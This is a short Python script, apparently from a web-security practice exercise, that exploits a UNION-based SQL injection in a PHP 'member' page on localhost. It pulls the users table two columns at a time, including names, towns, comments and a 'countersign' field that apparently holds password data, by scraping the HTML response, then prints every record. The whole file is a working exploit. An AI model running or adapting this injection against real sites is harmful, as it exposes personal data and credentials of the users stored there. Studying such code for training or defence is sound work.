from requests import get
import re

def dump_2_columns(col1: str, col2: str):
    id = f"0 UNION SELECT {col1}, {col2} FROM users"
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    txt = response.text
    c1 = []
    c2 = []
    if col1:
        c1 = re.findall(r"First name:\s*([^\n<]+)", txt)
    if col2:
        c2 = re.findall(r"Surname :\s*([^\n<]+)", txt)
    return [c1, c2]

def main():
    # user_id, first_name
    res = dump_2_columns("user_id", "first_name")
    user_ids = res[0]
    first_names = res[1]

    # last_name, town
    res = dump_2_columns("last_name", "town")
    last_names = res[0]
    towns = res[1]

    # country, planet
    res = dump_2_columns("country", "planet")
    countrys = res[0]
    planets = res[1]

    # Commentaire, countersign
    res = dump_2_columns("Commentaire", "countersign")
    Commentaires = res[0]
    countersigns = res[1]

    db = []

    for i in range(len(user_ids)):
        db.append({
            "user_id": user_ids[i],
            "first_name": first_names[i],
            "last_name": last_names[i],
            "town": towns[i],
            "country": countrys[i],
            "planet": planets[i],
            "Commentaire": Commentaires[i],
            "countersign": countersigns[i]
        })

    for entry in db:
        print("{")
        for key in entry:
            print(f"\t{key}: {entry[key]}")
        print("}")


if __name__ == "__main__":
	main()